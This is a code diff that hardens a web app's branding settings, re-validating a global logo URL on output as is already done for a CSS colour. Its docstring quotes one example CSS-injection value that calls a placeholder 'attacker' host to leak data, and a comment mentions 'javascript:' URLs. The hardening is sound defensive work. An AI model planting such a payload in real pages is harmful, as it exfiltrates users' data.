@@ -606,9 +606,10 @@ def app_branding(db: Session) -> Dict[str, Any]:
     stops an attribute breakout but not CSS itself -- ``red; background-image:
     url(https://attacker/?c=)`` stays inside the declaration and still calls
     out. Guarding at the sink covers values that predate the input validation,
-    values put there by a direct DB edit, and any future writer.
+    values put there by a direct DB edit, and any future writer. ``logo_url``
+    is re-checked the same way, for the same reason.
     """
-    from central.branding import safe_css_color
+    from central.branding import safe_css_color, safe_logo_url
 
     full = load_settings(db)
     out = {
@@ -617,6 +618,14 @@ def app_branding(db: Session) -> Dict[str, Any]:
         if key.startswith("app.")
     }
     out["primary_color"] = safe_css_color(out.get("primary_color"))
+    # Same re-check on the way out that `apply_client_overrides` already does
+    # for the per-client logo. The global value was the asymmetric one: it is
+    # operator free-text landing in an `<img src>`, it renders on **login.html**
+    # and so is served pre-auth, and nothing validated it on either the input or
+    # the output side. `javascript:` happens to be inert in `<img src>` today,
+    # which is exactly the "inert in the one place it is used right now"
+    # property `safe_logo_url`'s own comment says not to depend on.
+    out["logo_url"] = safe_logo_url(out.get("logo_url")) or ""
     return out
 
 
